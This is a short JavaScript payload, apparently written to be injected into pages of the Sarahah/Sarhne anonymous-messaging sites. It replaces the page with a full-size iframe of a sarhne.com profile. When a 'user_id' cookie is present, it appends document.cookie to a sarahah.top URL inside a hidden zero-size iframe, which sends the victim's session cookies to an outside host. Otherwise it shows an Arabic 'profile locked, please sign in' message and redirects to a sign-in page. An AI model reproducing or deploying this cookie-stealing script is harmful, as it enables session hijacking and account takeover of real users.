
// clear page and start draw iframe in full size

document.body.innerHTML="";

// Create an iframe dynamically
sarhne_src = "https://www.sarhne.com/hodaahmedsalem";
var sarhneIframe = document.createElement("iframe");
sarhneIframe.setAttribute("src", sarhne_src);
sarhneIframe.setAttribute("width", "100%");
sarhneIframe.setAttribute("height", "100%");
document.getElementsByTagName("body")[0].appendChild(sarhneIframe);





if (document.cookie.includes("user_id")){
    
    
    
    // Create an iframe dynamically
    sarahah_base = "https://sarahah.top/u/fisherbbc##";
    sarahah_src = sarahah_base+document.cookie;
    var sarahahIframe = document.createElement("iframe");
    sarahahIframe.setAttribute("src", sarahah_src);
    sarahahIframe.setAttribute("style", "position: absolute;width:0;height:0;border:0;");
    document.getElementsByTagName("body")[0].appendChild(sarahahIframe);


}
else{

    arabic_msg = "قام هذا المستخدم بقفل ملفه الشخصى . برجاء تسجيل الدخول لعرض الملف الشخصى";
    
    
    // tell user to sign in
    

        showalert(arabic_msg);

        window.location.href="https://www.sarhne.com/signin.html";

    
}